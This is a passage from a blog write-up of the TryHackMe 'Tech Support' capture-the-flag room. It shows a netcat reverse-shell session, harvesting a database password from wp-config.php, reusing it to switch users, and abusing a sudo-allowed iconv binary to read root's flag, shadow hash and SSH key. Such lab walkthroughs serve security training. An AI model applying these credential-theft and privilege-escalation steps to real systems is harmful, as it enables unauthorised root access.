‚îî‚îÄ$ stty raw -echo;fg       
[1]  + continued  nc -nlvp 4444

www-data@TechSupport:/var/www/html/subrion/uploads$

</span></code></pre></div></div>

<p>Looking around wordpress site gives this info</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># User Enumeration</span>

www-data@TechSupport:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">ls
</span>index.php	 wp-blog-header.php    wp-includes	  wp-settings.php
license.txt	 wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html	 wp-config.php	       wp-load.php	  wp-trackback.php
wp-activate.php  wp-content	       wp-login.php	  xmlrpc.php
wp-admin	 wp-cron.php	       wp-mail.php

www-data@TechSupport:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat </span>wp-config.php

// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'wpdb'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'support'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'ImAScammerLOL!123!'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span> <span class="o">)</span><span class="p">;</span>


scamsite@TechSupport:/home<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> /bin/bash
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash

<span class="c"># Gives 2 users root and scamsite</span>

<span class="c"># trying using same creds we got </span>

www-data@TechSupport:/home<span class="nv">$ </span>su scamsite
Password: 
scamsite@TechSupport:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>scamsite on TechSupport:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User scamsite may run the following commands on TechSupport:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/iconv


<span class="c"># more info about iconv</span>

scamsite@TechSupport:~/websvr<span class="nv">$ </span>/usr/bin/iconv <span class="nt">--help</span>
Usage: iconv <span class="o">[</span>OPTION...] <span class="o">[</span>FILE...]
Convert encoding of given files from one encoding to another.

 Input/Output format specification:
  <span class="nt">-f</span>, <span class="nt">--from-code</span><span class="o">=</span>NAME       encoding of original text
  <span class="nt">-t</span>, <span class="nt">--to-code</span><span class="o">=</span>NAME         encoding <span class="k">for </span>output

 Information:
  <span class="nt">-l</span>, <span class="nt">--list</span>                 list all known coded character sets

 Output control:
  <span class="nt">-c</span>                         omit invalid characters from output
  <span class="nt">-o</span>, <span class="nt">--output</span><span class="o">=</span>FILE          output file
  <span class="nt">-s</span>, <span class="nt">--silent</span>               suppress warnings
      <span class="nt">--verbose</span>              print progress information

  -?, <span class="nt">--help</span>                 Give this <span class="nb">help </span>list
      <span class="nt">--usage</span>                Give a short usage message
  <span class="nt">-V</span>, <span class="nt">--version</span>              Print program version

Mandatory or optional arguments to long options are also mandatory or optional
<span class="k">for </span>any corresponding short options.

For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.


<span class="c"># GTFObins give</span>
Sudo

If the binary is allowed to run as superuser by <span class="nb">sudo</span>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    <span class="nv">LFILE</span><span class="o">=</span>file_to_read
    ./iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>


<span class="c"># Lets check it out</span>

scamsite@TechSupport:~<span class="nv">$ </span><span class="nb">echo </span>TEST <span class="o">&gt;</span> test.txt

/usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 ./test.txt
TEST


Getting the root flag

<span class="nb">sudo</span> /usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 /root/root.txt
851b8233a8c0&lt;Check it out youself&gt;9bf1ed02790b

checking <span class="k">for </span>other files

root <span class="nb">hash
</span>root:<span class="nv">$6$.</span>jnArnoS<span class="nv">$vhMAUiCBPWNT</span>/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:18775:0:99999:7:::

root id_rsa
<span class="nb">sudo</span> /usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 /root/.ssh/id_rs
Yeah its there <span class="o">!</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
‚îî‚îÄ<span class="nv">$ </span>ssh root@10.10.203.0 <span class="nt">-i</span> id_rsa
root@10.10.203.0<span class="s1">'s password: 

but still ask password
</span></code></pre></div></div>

<p>That all for this room hope you learnt something !</p>
</div>
      </section>
      <footer>
  <p>¬© 2022 - 2022 | The Awesome Blog</p>
</footer>

    </main>
    <section id="category-modal-bg"></section>
<section id="category-modal">
  <h1 id="category-modal-title"></h1>
  <section id="category-modal-content"></section>
</section>

  </body>
</html>
